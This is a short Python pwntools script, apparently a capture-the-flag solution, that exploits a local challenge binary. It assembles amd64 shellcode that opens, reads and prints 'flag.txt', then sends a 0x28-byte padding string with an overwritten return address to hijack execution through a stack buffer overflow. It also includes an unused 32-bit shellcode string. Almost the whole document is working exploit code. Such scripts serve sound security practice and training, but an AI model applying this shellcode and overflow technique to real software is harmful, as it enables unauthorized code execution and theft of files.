from pwn import *

printst = "\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe6\xff\xff\xff\x5a\x69\x6c\x63\x68\x47\x6c\x74\x63\x68\x00"

context.arch = "amd64"

shellcode = asm("""  
mov rdx,0x7478742e67616c66
push 0x00
push rdx

mov rax,2 
mov rsi,4
lea rdi,[rsp]
syscall

mov rdi,rax
mov rdx,24
mov rax,0
lea rsi,[rsp+0x32]
syscall

mov rax,1
mov rdi,1
mov rdx,24
lea rsi,[rsp+0x32]
syscall

mov rax,60
syscall
""")

context.terminal = ['kitty', '-e', 'sh', '-c']
io = process('./challs/chall(1)')

print(io.recv().decode())
io.sendline(shellcode)
print(io.recv().decode())
#gdb.attach(io)
io.sendline('A' * 0x28 + '\x70\x40\x40\x00\x00')
#io.interactive()
print(io.recv().decode())

